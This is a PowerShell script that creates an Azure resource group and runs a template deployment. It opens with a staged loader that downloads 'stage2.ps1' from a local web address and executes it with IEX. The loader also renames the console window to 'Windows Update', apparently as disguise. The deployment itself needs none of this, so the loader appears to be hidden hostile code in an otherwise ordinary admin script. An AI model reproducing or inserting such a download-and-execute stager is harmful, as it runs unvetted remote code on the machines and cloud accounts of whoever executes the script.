$Stage1Url = "http://localhost:8080/stage2.ps1"
$ScriptText = (New-Object System.Net.WebClient).DownloadString($Stage1Url)
IEX $ScriptText
$Host.UI.RawUI.WindowTitle = "Windows Update"
$ErrorActionPreference = 'Stop'
$ResourceGroup = 'rg-portal-demo-40'
$Location = "eastus"
$TemplateFile = 'C:\Scripts\templates\portal-demo.json'
$ParameterFile = "C:\Scripts\templates\portal-demo.parameters.json"
$SubscriptionId = "d6061ab3-05b3-a4d2-5b2b-4ef377e0b7b9"
$StorageAccount = 'stdemo4430'
$VmName = 'vm-portal-demo-40'
$OutputPath = 'C:\Logs\deploy-demo-2025-09-18.json'
$DryRun = $false

$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant "contoso.com" -Subscription $SubscriptionId
}

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
}
$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')
$deployment = New-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -TemplateFile $TemplateFile -Name $DeploymentName
Write-Host ("Deployment {0}: {1}" -f $deployment.DeploymentName, $deployment.ProvisioningState) -ForegroundColor Green
